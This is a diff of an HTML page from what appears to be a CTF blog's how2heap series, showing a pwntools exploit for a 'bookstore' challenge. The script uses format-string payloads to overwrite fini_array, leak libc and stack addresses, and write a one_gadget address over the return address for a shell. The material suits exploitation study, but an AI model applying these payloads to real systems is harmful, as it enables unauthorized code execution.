-        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
-        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
-    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
-
-<span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
-<span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
-<span class=n>exp</span><span class=p>()</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id=reference>Reference</h2>
-<ol>
-<li>how2heap overlapping chunks</li>
-<li><a href=https://bbs.pediy.com/thread-246783.htm>https://bbs.pediy.com/thread-246783.htm</a></li>
-</ol>
-</div>
-<div class=post-copyright>
-<p class=copyright-item>
-<span class=item-title>文章作者</span>
-<span class=item-content>hhdx</span>
-</p>
-<p class=copyright-item>
-<span class=item-title>上次更新</span>
-<span class=item-content>
-2020-07-05
-</span>
-</p>
-</div>
-<footer class=post-footer>
-<div class=post-tags>
-<a href=/tags/how2heap/>how2heap</a>
-<a href=/tags/ctf/>CTF</a>
-</div>
-<nav class=post-nav>
-<a class=prev href=/post/how2heap-house-of-force-bctf2016-bcloud/>
-<i class="iconfont icon-left"></i>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;info&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./bookstore&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>menu</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;5: Submit</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>fini_array</span> <span class=o>=</span> <span class=mh>0x6011B8</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts_got</span>   <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>free_got</span>   <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s2>&#34;free&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># phase 1</span>
+</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;4&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># format string: overwrite fini_arrary with start, leak libc and stack</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=si>%1920x</span><span class=s2>%13$hn...%14$s,,,%28$llx&#34;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x151</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b *0x400B09&#34;)</span>
+</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;5&#34;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span><span class=o>*</span><span class=mi>7</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>fini_array</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_got</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># leak libc and stack</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;...&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;,,,&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>stack_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>12</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>ret_addr</span> <span class=o>=</span> <span class=n>stack_addr</span> <span class=o>-</span> <span class=mh>0x288</span>
+</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;puts&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#########################################################</span>
+</span></span><span class=line><span class=cl><span class=c1>#   fail when part1 + part2 is too big (possible reason...</span>
+</span></span><span class=line><span class=cl><span class=c1>#########################################################</span>
+</span></span><span class=line><span class=cl>    <span class=c1># one_gadget = libc_base + 0x40d82</span>
+</span></span><span class=line><span class=cl>    <span class=c1># part1 =  one_gadget      % (1&lt;&lt;16)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># part2 = (one_gadget&gt;&gt;16) % (1&lt;&lt;16)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># log.debug(&#34;0x%x&#34; % part1)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># log.debug(&#34;0x%x&#34; % part2)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># if part2 &gt; part1:</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#     part2 = part2 - part1</span>
+</span></span><span class=line><span class=cl>    <span class=c1># else:</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#     part2 = part2 + ((1&lt;&lt;16)-part1)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># log.debug(&#34;0x%x&#34; % part1)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># log.debug(&#34;0x%x&#34; % part2)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1># log.debug(&#34;ret addr: 0x%x&#34; % ret_addr)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># log.debug(&#34;one gadget: 0x%x&#34; % one_gadget)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1># # phase 2</span>
+</span></span><span class=line><span class=cl>    <span class=c1># menu(b&#39;4&#39;)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># payload = b&#34;%&#34; + str(part1).encode(&#34;ascii&#34;) + b&#34;x%13$hn&#34; + b&#34;%&#34; + str(part2).encode(&#34;ascii&#34;) + b&#34;x%14$hn&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=c1># payload = payload.ljust(0x90-28, b&#34;A&#34;).ljust(0x88, b&#34;\x00&#34;) + p64(0x151)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># menu(b&#34;1&#34;)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># io.sendline(payload)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># # gdb.attach(io, &#34;b *0x400B09&#34;)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># menu(b&#34;5&#34; + p8(0x1)*7 + p64(ret_addr) + p64(ret_addr+2))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>one_gadget</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x40d82</span>
+</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;one gadget: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>one_gadget</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>one_gadget</span>       <span class=o>&amp;</span> <span class=mh>0xff</span>
+</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>8</span><span class=p>)</span>  <span class=o>&amp;</span> <span class=mh>0xff</span>
+</span></span><span class=line><span class=cl>    <span class=n>p3</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
+</span></span><span class=line><span class=cl>    <span class=n>p4</span> <span class=o>=</span> <span class=p>(</span><span class=n>one_gadget</span><span class=o>&gt;&gt;</span><span class=mi>24</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>part1</span> <span class=o>=</span> <span class=n>p1</span>
+</span></span><span class=line><span class=cl>    <span class=n>part2</span> <span class=o>=</span> <span class=n>p2</span><span class=o>-</span><span class=n>p1</span> <span class=k>if</span> <span class=n>p2</span> <span class=o>&gt;</span> <span class=n>p1</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p1</span><span class=o>+</span><span class=n>p2</span>
+</span></span><span class=line><span class=cl>    <span class=n>part3</span> <span class=o>=</span> <span class=n>p3</span><span class=o>-</span><span class=n>p2</span> <span class=k>if</span> <span class=n>p3</span> <span class=o>&gt;</span> <span class=n>p2</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p2</span><span class=o>+</span><span class=n>p3</span>
+</span></span><span class=line><span class=cl>    <span class=n>part4</span> <span class=o>=</span> <span class=n>p4</span><span class=o>-</span><span class=n>p3</span> <span class=k>if</span> <span class=n>p4</span> <span class=o>&gt;</span> <span class=n>p3</span> <span class=k>else</span> <span class=mi>256</span><span class=o>-</span><span class=n>p3</span><span class=o>+</span><span class=n>p4</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span>  <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part1</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%13$hhn%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part2</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%14$hhn&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>+=</span> <span class=sa>b</span><span class=s2>&#34;%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part3</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%15$hhn%&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>part4</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;ascii&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;x%16$hhn&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x90</span><span class=o>-</span><span class=mi>28</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0x88</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x151</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b *0x400B09&#34;)</span>
+</span></span><span class=line><span class=cl>    <span class=n>menu</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;5&#34;</span> <span class=o>+</span> <span class=n>p8</span><span class=p>(</span><span class=mh>0x1</span><span class=p>)</span><span class=o>*</span><span class=mi>7</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=o>+</span><span class=mi>3</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>exp</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=reference>Reference</h2><ol><li>how2heap overlapping chunks</li><li><a href=https://bbs.pediy.com/thread-246783.htm>https://bbs.pediy.com/thread-246783.htm</a></li></ol></div><div class=post-copyright><p class=copyright-item><span class=item-title>文章作者</span>
+<span class=item-content>hhdx</span></p><p class=copyright-item><span class=item-title>上次更新</span>
+<span class=item-content>2020-07-05</span></p></div><footer class=post-footer><div class=post-tags><a href=/tags/how2heap/>how2heap</a>
+<a href=/tags/ctf/>CTF</a></div><nav class=post-nav><a class=prev href=/post/how2heap-house-of-force-bctf2016-bcloud/><i class="iconfont icon-left"></i>
 <span class="prev-text nav-default">How2heap--house_of_force Bctf2016--bcloud</span>
-<span class="prev-text nav-mobile">上一篇</span>
-</a>
-<a class=next href=/post/how2heap-poison-null-byte-plaidctf2015-plaiddb/>
-<span class="next-text nav-default">How2heap--poison_null_byte Plaidctf2015--plaiddb</span>
+<span class="prev-text nav-mobile">上一篇</span></a>
+<a class=next href=/post/how2heap-poison-null-byte-plaidctf2015-plaiddb/><span class="next-text nav-default">How2heap--poison_null_byte Plaidctf2015--plaiddb</span>
 <span class="next-text nav-mobile">下一篇</span>
-<i class="iconfont icon-right"></i>
-</a>
-</nav>
-</footer>
-</article>
-</div>
-<div id=disqus_thread></div>
-<script type=text/javascript>(function(){var a,b;if(window.location.hostname==='localhost')return;a=document.createElement('script'),a.type='text/javascript',a.async=!0,b='lyliuchao',a.src='//'+b+'.disqus.com/embed.js',(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(a)})()</script>
-<noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
-</div>
-</main>
-<footer id=footer class=footer>
-<div class=social-links>
-<a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
-<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a>
-<a href=https://hhdx.xyz/index.xml type=application/rss+xml class="iconfont icon-rss" title=rss></a>
-</div>
-<div class=copyright>
-<span class=power-by>
-由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动
-</span>
+<i class="iconfont icon-right"></i></a></nav></footer></article></div><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname==="localhost")return;var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="lyliuchao",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript></div></main><footer id=footer class=footer><div class=social-links><a href=https://github.com/clxsh class="iconfont icon-github" title=github></a>
+<a href=https://www.douban.com/people/57285004/ class="iconfont icon-douban" title=douban></a></div><div class=copyright><span class=power-by>由 <a class=hexo-link href=https://gohugo.io>Hugo</a> 强力驱动</span>
 <span class=division>|</span>
-<span class=theme-info>
-主题 -
-<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a>
-</span>
-<span class=copyright-year>
-&copy;
+<span class=theme-info>主题 -
+<a class=theme-link href=https://github.com/olOwOlo/hugo-theme-even>Even</a></span>
+<span class=copyright-year>&copy;
 2016 -
-2021<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span>
-</span>
-</div>
-</footer>
-<div class=back-to-top id=back-to-top>
-<i class="iconfont icon-up"></i>
-</div>
-</div>
-<script src=https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin=anonymous></script>
+2023<span class=heart><i class="iconfont icon-heart"></i></span><span>hhdx</span></span></div></footer><div class=back-to-top id=back-to-top><i class="iconfont icon-up"></i></div></div><script src=https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js integrity=sha384-NXgwF8Kv9SSAr+jemKKcbvQsz+teULH/a5UNJvZc6kP47hZgl62M1vGnw6gHQhb1 crossorigin=anonymous></script>
 <script src=https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin=anonymous></script>
 <script src=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin=anonymous></script>
-<script type=text/javascript src=/js/main.min.c99b103c33d1539acf3025e1913697534542c4a5aa5af0ccc20475ed2863603b.js></script>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-177325662-1','auto'),ga('set','anonymizeIp',!0),ga('send','pageview'))</script>
-<script async src=https://www.google-analytics.com/analytics.js></script>
-</body>
-</html>
+<script type=text/javascript src=/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js></script>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-177325662-1","auto"),ga("set","anonymizeIp",!0),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script></body></html>
